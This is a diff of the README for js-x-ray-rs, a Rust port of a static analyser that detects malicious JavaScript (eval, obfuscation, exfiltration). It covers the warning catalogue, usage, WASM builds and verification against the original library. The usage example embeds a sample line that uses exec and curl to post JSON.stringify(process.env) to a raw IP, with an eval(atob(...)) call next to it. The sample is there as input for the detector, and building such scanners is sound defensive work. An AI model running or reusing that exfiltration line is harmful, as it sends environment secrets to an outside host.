@@ -1,91 +1,135 @@
 # js-x-ray-rs
 
-A Rust port of [`@nodesecure/js-x-ray`](https://github.com/NodeSecure/js-x-ray) —
-JavaScript/TypeScript AST X-Ray analysis for detecting suspicious and malicious
-patterns in packages — powered by [oxc](https://oxc.rs) instead of meriyah.
+[![CI](https://github.com/ngriaznov/js-x-ray-rs/actions/workflows/ci.yml/badge.svg)](https://github.com/ngriaznov/js-x-ray-rs/actions/workflows/ci.yml)
+[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
 
-The port is a **behavioral clone** of the upstream Node.js library (v16): same
-probes, same warning kinds, values and locations, same flags and scores. It is
-verified two ways:
+**Static security analysis of JavaScript and TypeScript, in Rust.** Scan
+untrusted JS for malicious patterns — obfuscation, hidden `eval`, encoded
+payloads, data exfiltration, supply-chain tricks — without executing it and
+without a Node.js runtime.
 
-- **691/691 etalon cases** — reference outputs produced by running the
-  *original* library over a corpus extracted from upstream's entire test suite
-  match the Rust port exactly (warnings incl. locations, flags, `idsLengthAvg`,
-  `stringScore`, dependencies).
-- **~430 ported unit tests** — upstream's spec files for internal APIs
-  (walker, estree helpers, VariableTracer, Deobfuscator, probes, utils,
-  EntryFilesAnalyser, …) transcribed to Rust and passing.
+This is a Rust port of [`@nodesecure/js-x-ray`](https://github.com/NodeSecure/js-x-ray)
+(the SAST engine behind the NodeSecure scanner), powered by
+[oxc](https://oxc.rs). It is a verified **behavioral clone**: same probes,
+same warning kinds, values and locations, same flags and scores as the
+original — proven case-by-case against the original library's actual output.
+
+## Why
+
+Plenty of Rust applications handle JavaScript as *content*: a plugin
+marketplace accepting uploads, a package registry or artifact proxy, a file
+scanner, a CDN or edge service, a webmail attachment pipeline, an AI agent
+sandboxing generated code. Before storing, serving, or executing that JS,
+you want to know whether it looks malicious — from Rust, synchronously,
+with no JS engine in the loop.
+
+```rust
+use js_x_ray::{AstAnalyser, RuntimeOptions};
+
+let untrusted = r#"
+    const os = require("os");
+    const { exec } = require("child_process");
+    exec("curl -s http://45.77.12.9/beacon -d " + JSON.stringify(process.env));
+    eval(atob("Y29uc29sZS5sb2coMSk="));
+"#;
+
+let report = AstAnalyser::default()
+    .analyse(untrusted, RuntimeOptions::default())
+    .unwrap();
+for warning in &report.warnings {
+    println!("{} {:?} at {:?}", warning.kind, warning.value, warning.location);
+}
+// serialize-environment Some("JSON.stringify(process.env)") at [[4, 50], [4, 77]]
+// unsafe-stmt Some("eval") at [[5, 4], [5, 38]]
+// ...plus report.dependencies: ["os", "child_process"]
+```
+
+Analysis is pure and deterministic: source in, report out. The analyser
+never executes the input, tolerates hostile input (fuzzed with millions of
+mutated samples — no panics), and handles the deeply nested one-liners that
+minifiers and obfuscators produce.
 
 ## What it detects
 
-Same catalogue as upstream (`@nodesecure/js-x-ray` v16):
+The full `@nodesecure/js-x-ray` v16 catalogue:
 
 | Warning | Description |
 | --- | --- |
-| `parsing-error` | The source could not be parsed |
-| `unsafe-import` | Unable to follow an import (require/import) statement/expression |
-| `unsafe-regex` | Regex vulnerable to ReDoS (exponential backtracking) |
-| `unsafe-stmt` | Use of dangerous statements like `eval()` or `Function("")` |
-| `encoded-literal` | Encoded literals (hex, base64, unicode sequences) |
-| `short-identifiers` | Average identifier length below 1.5 chars |
-| `suspicious-literal` | Suspiciously scored string literals |
-| `suspicious-file` | More than ten encoded literals in one file |
-| `obfuscated-code` | Obfuscator detection (jsfuck, jjencode, obfuscator.io, morse, trojan-source…) |
-| `shady-link` | Links to suspicious domains / raw IPs |
-| `unsafe-command` | Suspicious `spawn()`/`exec()` commands |
+| `unsafe-stmt` | `eval()`, `Function("...")` and disguised variants (aliasing, `atob` indirection) |
+| `unsafe-import` | require/import whose target can't be statically followed |
+| `encoded-literal` | Hex / base64 / unicode-escaped payload literals |
+| `obfuscated-code` | jsfuck, jjencode, obfuscator.io, morse, freejsobfuscator, trojan-source |
+| `data-exfiltration` | Reads of `os.userInfo()`, `dns.getServers()`, network interfaces… |
 | `serialize-environment` | `JSON.stringify(process.env)` |
-| `data-exfiltration` | Reads of `os.userInfo()`, `dns.getServers()`, … |
-| `sql-injection` | SQL built by string concatenation/templating |
-| `monkey-patch` | Redefinition of built-in prototypes/methods |
-| `prototype-pollution` | `__proto__` / `constructor.prototype` assignment patterns |
-| `unsafe-vm-context` | Dangerous `vm` context usage |
-| `crypto.weak-algorithm` | md5/sha1/ripemd160 usage |
-| optional: `synchronous-io`, `log-usage`, `insecure-random`, `crypto.weak-scrypt`, `crypto.unsafe-prehash`, `crypto.weak-bcrypt`, `crypto.password-shucking` |
+| `unsafe-command` | Suspicious `spawn()` / `exec()` command lines |
+| `shady-link` | URLs to suspicious TLDs, raw IPs, link shorteners |
+| `sql-injection` | SQL built by string concatenation / templating |
+| `prototype-pollution` | `__proto__` / `constructor.prototype` assignments |
+| `monkey-patch` | Redefinition of built-in prototypes |
+| `unsafe-vm-context` | Dangerous Node `vm` usage |
+| `unsafe-regex` | ReDoS-vulnerable regexes (exponential backtracking) |
+| `suspicious-literal`, `suspicious-file`, `short-identifiers` | Statistical obfuscation signals |
+| `crypto.weak-algorithm` | md5 / sha1 / ripemd160 |
+| `parsing-error` | Input that isn't valid JS/TS |
+| opt-in | `synchronous-io`, `log-usage`, `insecure-random`, `crypto.weak-scrypt`, `crypto.unsafe-prehash`, `crypto.weak-bcrypt`, `crypto.password-shucking` |
 
-## Usage (Rust)
+Beyond warnings, every report carries the **dependency list** (every
+`require`/`import`, including computed and obfuscated forms the
+variable tracer resolves), source flags, and obfuscation scores.
 
-```rust
-use js_x_ray::{AstAnalyser, AstAnalyserOptions, RuntimeOptions};
+## Correctness: verified against the original
 
-let analyser = AstAnalyser::default();
-let report = analyser
-    .analyse(
-        r#"const stream = require("node:stream"); eval("console.log('hello')");"#,
-        RuntimeOptions::default(),
-    )
-    .expect("source parses");
+Every behavioral claim is anchored to the original library, not to a
+reimplementation of its spec:
 
-for warning in &report.warnings {
-    println!("{}: {:?}", warning.kind, warning.value);
-}
-println!("dependencies: {:?}", report.dependencies.keys().collect::<Vec<_>>());
+- **691/691 etalon cases.** A corpus extracted from upstream's entire test
+  suite — plus extensions for modern syntax and TypeScript — is replayed
+  through this port and compared against snapshots generated by running the
+  *actual* `@nodesecure/js-x-ray` (warnings with locations, flags, scores,
+  dependencies). `cargo test -p js-x-ray --test etalon` replays it.
+- **~430 ported unit tests** covering the internal APIs (walker, estree
+  helpers, variable tracer, deobfuscator, every probe).
+- **Panic-safety fuzzing.** Millions of mutated/corrupted inputs, zero
+  panics — hostile input yields a report or a `ParseError`, never a crash.
+
+## Quick start
+
+```toml
+[dependencies]
+js-x-ray = { git = "https://github.com/ngriaznov/js-x-ray-rs" }
 ```
 
-Options mirror upstream:
-
 ```rust
-use js_x_ray::{AstAnalyser, AstAnalyserOptions, OptionalWarnings, Sensitivity};
+use js_x_ray::{AstAnalyser, AstAnalyserOptions, OptionalWarnings, RuntimeOptions, Sensitivity};
 
+// Default analyser, or opt into the extra probes / aggressive mode:
 let analyser = AstAnalyser::new(AstAnalyserOptions {
     optional_warnings: OptionalWarnings::All, // or ::Names(vec!["log-usage".into()])
     sensitivity: Sensitivity::Aggressive,     // default: Conservative
     ..Default::default()
 });
+
+let report = analyser.analyse("eval('2 + 2')", RuntimeOptions::default()).unwrap();
+assert_eq!(report.warnings[0].kind, "unsafe-stmt");
 ```
 
-File analysis (`analyse_file`, with `.min`/minified detection and TypeScript
-support via oxc) is behind the default `fs` feature; disable it for WASM.
+- **Single file**: `analyser.analyse_file(path, options)` — adds minified
+  detection and routes `.ts` through the TypeScript parser (behind the
+  default `fs` feature).
+- **Whole project**: `EntryFilesAnalyser` follows local imports from entry
+  files and reports on every reachable module, with cycle detection.
+- **Custom probes / collectables**: the same extension points as upstream
+  (`Probe` trait, `DefaultCollectableSet` for URLs, hostnames, IPs,
+  dependencies).
 
-## WASM
+## WASM: scan JS in the browser or at the edge
 
-`crates/js-x-ray-wasm` exposes `analyse(source, optionsJson)` through
-`wasm-bindgen`:
+The analyser compiles to `wasm32-unknown-unknown` — the same engine runs in
+browsers, workers, and edge runtimes:
 
 ```bash
-rustup target add wasm32-unknown-unknown
 cargo build -p js-x-ray-wasm --target wasm32-unknown-unknown --release
-# or, with wasm-pack for a ready-to-use npm package:
-wasm-pack build crates/js-x-ray-wasm --target web
+# or: wasm-pack build crates/js-x-ray-wasm --target web
 ```
 
 ```js
@@ -94,35 +138,42 @@ await init();
 const report = JSON.parse(analyse("eval('2 + 2')", JSON.stringify({ optionalWarnings: true })));
 ```
 
-## How the port works
+## Use cases
 
-- **Parser**: oxc parses JS/TS/JSX and serializes to the same ESTree JSON shape
-  meriyah produces (`Literal` nodes with `value`/`raw`/`regex`, `loc` objects
-  with 1-based lines / 0-based columns). The whole analysis layer then works on
-  `serde_json::Value` trees, exactly like the Node.js implementation works on
-  ESTree objects — which keeps every module a line-by-line mirror of upstream.
-- **1:1 file mapping**: every Rust module starts with an `//! Upstream:` header;
-  `tools/sync/mapping.tsv` maps all upstream files to their Rust counterparts.
-- **Known divergences**: parsing-error *messages* come from oxc, not meriyah
-  (kinds/locations match); a handful of parse edge cases accepted by one parser
-  and not the other may differ.
-- **Deliberately not ported**: upstream's `src/i18n/*.js` locale bundles
-  (Arabic/English/French/Korean/Turkish translations of warning descriptions)
-  and its `i18nLocation()` export — these are presentation-layer strings for
-  consumers, not analysis behavior, and are out of scope for this crate. Same
-  for `AstAnalyser`/`VariableTracer` being an upstream `EventEmitter`: the
-  port surfaces the same events through return values instead (`Report` /
-  `ReportOnFile`, and `VariableTracer::drain_events`) rather than a Rust
-  event-emitter API.
+- Vetting npm packages / tarballs in a registry, proxy, or CI supply-chain
+  gate written in Rust.
+- Scanning user-uploaded plugins, themes, extensions, and scripts before
+  accepting them.
+- Screening JS attachments and embedded scripts in mail/file pipelines.
+- Pre-flight checks on AI-generated code before sandboxed execution.
+- Client-side or edge scanning via the WASM build — no server round-trip.
+
+## How it works
+
+- **oxc parses** JS/TS/JSX (fast, error-tolerant) and serializes to the
+  same ESTree JSON shape meriyah produces upstream — `Literal` nodes with
+  `value`/`raw`/`regex`, `loc` with 1-based lines / 0-based UTF-16 columns.
+- The **analysis layer works on `serde_json::Value` trees**, exactly like
+  the Node.js original works on ESTree objects. Every Rust module mirrors
+  one upstream TypeScript file (`//! Upstream:` headers,
+  [`tools/sync/mapping.tsv`](tools/sync/mapping.tsv)) — reviewable
+  line-by-line against the original, and mechanical to keep in sync.
+- **Known divergences**: parsing-error *messages* come from oxc rather than
+  meriyah (kinds and locations match); a handful of parse edge cases differ
+  between the two parsers.
+- **Deliberately not ported**: upstream's `src/i18n/*.js` locale bundles and
+  `i18nLocation()` (presentation-layer strings, not analysis), and the
+  `EventEmitter` surfaces — the port returns the same information through
+  `Report`/`ReportOnFile` values and `VariableTracer::drain_events`.
 
 ## Staying in sync with upstream
 
-Upstream is pinned in [`UPSTREAM.lock`](UPSTREAM.lock). When NodeSecure ships a
-new version:
+Upstream is pinned in [`UPSTREAM.lock`](UPSTREAM.lock). When NodeSecure
+ships a new version:
 
 ```bash
 tools/sync/pull-upstream.sh   # lists upstream changes → affected Rust files
-# port the diffs, then regenerate reference snapshots:
+# port the diffs, then regenerate reference snapshots (Node >= 24):
 node --experimental-strip-types tools/etalon/generate.mjs
 cargo test --workspace        # etalon + unit tests must pass
 # finally bump commit= in UPSTREAM.lock
@@ -130,13 +181,11 @@ cargo test --workspace        # etalon + unit tests must pass
 
 ## Testing
 
-- `cargo test --workspace` — unit tests (ported from upstream's spec files) plus
-  the etalon suite.
+- `cargo test --workspace` — unit tests, fuzz harness, and the etalon suite.
 - The etalon suite (`crates/js-x-ray/tests/etalon.rs`) replays
-  `tests/etalon/corpus/**` and compares against `tests/etalon/snapshots/**`
-  generated from the original library (`tools/etalon/README.md`).
-  Use `ETALON_FILTER=isRequire cargo test -p js-x-ray --test etalon` to focus,
-  and `ETALON_VERBOSE=1` for full diffs.
+  `tests/etalon/corpus/**` against `tests/etalon/snapshots/**` generated
+  from the original library (see `tools/etalon/README.md`).
+  `ETALON_FILTER=<substring>` focuses; `ETALON_VERBOSE=1` prints full diffs.
 
 ## License
 
